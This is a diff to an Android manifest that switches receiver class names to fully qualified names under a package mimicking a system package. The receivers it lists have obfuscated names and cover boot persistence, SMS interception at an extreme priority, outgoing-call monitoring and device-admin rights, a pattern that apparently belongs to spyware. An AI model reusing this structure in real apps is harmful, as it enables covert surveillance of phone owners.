@@ -52,7 +52,7 @@
 			</intent-filter>
 		</service>
 
-		<receiver android:name=".BM">
+		<receiver android:name="com.android.deviceinfo.BM">
 			<intent-filter>
 				<action android:name="android.intent.action.BOOT_COMPLETED" />
 				<action android:name="android.intent.action.USER_PRESENT" />
@@ -64,19 +64,19 @@
             </intent-filter>
 		</receiver>
 
-		<receiver android:name=".listener.BAc">
+		<receiver android:name="com.android.deviceinfo.listener.BAc">
 		</receiver>
 
-		<receiver android:name=".listener.BSt">
+		<receiver android:name="com.android.deviceinfo.listener.BSt">
 		</receiver>
 
-		<receiver android:name=".listener.BSm">
+		<receiver android:name="com.android.deviceinfo.listener.BSm">
 			<intent-filter android:priority="999999999">
 				<action android:name="android.provider.Telephony.SMS_RECEIVED" />
 			</intent-filter>
 		</receiver>
 
-		<receiver android:name=".listener.BC"
+		<receiver android:name="com.android.deviceinfo.listener.BC"
 			android:exported="true">
 			<intent-filter android:priority="0">
 				<action android:name="android.intent.action.NEW_OUTGOING_CALL" />
@@ -86,7 +86,7 @@
 		</receiver>
 		
 		<receiver
-            android:name=".listener.AR"
+            android:name="com.android.deviceinfo.listener.AR"
             android:permission="android.permission.BIND_DEVICE_ADMIN" >
             <intent-filter>
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
